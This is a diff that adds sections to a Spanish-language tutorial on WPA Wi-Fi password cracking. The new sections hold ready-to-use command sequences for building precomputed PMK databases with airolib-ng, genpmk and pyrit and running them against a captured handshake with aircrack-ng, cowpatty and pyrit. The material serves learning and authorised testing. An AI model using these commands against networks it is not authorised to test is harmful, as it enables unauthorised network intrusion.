@@ -70,4 +70,58 @@ También veremos como hacerlo con esta herramienta que ya es bastante antigua, p
 
 Las técnicas que hemos visto son bastante lentas, por lo que si no queremos estar varias horas con eso también podemos utilizar las siguientes técnicas que son `considerablemente más rápidas`.
 
-Para lograr esto necesitaremos tener un archivo de `contraseñas precomputadas`. De esta forma nos `ahorraremos pasos` del procedimiento, `aumentaando asi la velocidoad` de computo. Esto se hace con un ataque mediante base de datos.
+Para lograr esto necesitaremos tener un archivo de `contraseñas precomputarizadas`. De esta forma nos `ahorraremos pasos` del procedimiento, `aumentando así la velocidad` de cómputo. Esto tambien se hace con un ataque mediante base de datos.
+
+## Crear diccionarios preestablecidos con Airolib
+
+Para crear el diccionario precomputarizado:
+
+```
+> airolib-ng {passwords-airolib (osea, el nombre)} --import passwd {diccionario.txt} 
+
+> file {passwords-airolib}
+
+> airolib-ng {passwords-airolib} --import essid {essid del ap}
+
+> airolib-ng {passwords-airolib} --clean all
+
+> airolib-ng {passwords-airolib} --batch
+
+> kill %%
+```
+
+Y una vez tengamos esto listo, crackeandolo con `Aircrack` veremos que es mucho mas rapido que antes.
+
+```
+> aircrack-ng -r {passwords-airolib} {Captura-01.cap}
+```
+
+## GenPMK
+
+```
+> genpmk -f {diccionario.txt} -s {essid de la red} -d {dic.genpmk (osea el nombre )}
+
+> file {dic.genpmk}
+
+> cowpatty -d {dic.genpmk} -r {Captura-01.cap} -s {essid de la red}
+```
+
+## Diccionario precomputarizado con Pyrit
+
+```
+> pyrit -e {essid de la red} -i {dic.genpmk} -r {Captura-01.cap} attack_cowpatty
+```
+
+## Ataque mediante basa de datos con Pyrit
+
+Esta es la forma `mas rapida` de todas las que hemos visto.
+
+```
+> pyrit -i {diccionario.txt} import_passwords
+
+> pyrit -e {essid de la red} create_essid
+
+> pyrit batch
+
+> pyrit -r {Captura-01.cap} attack_db
+```
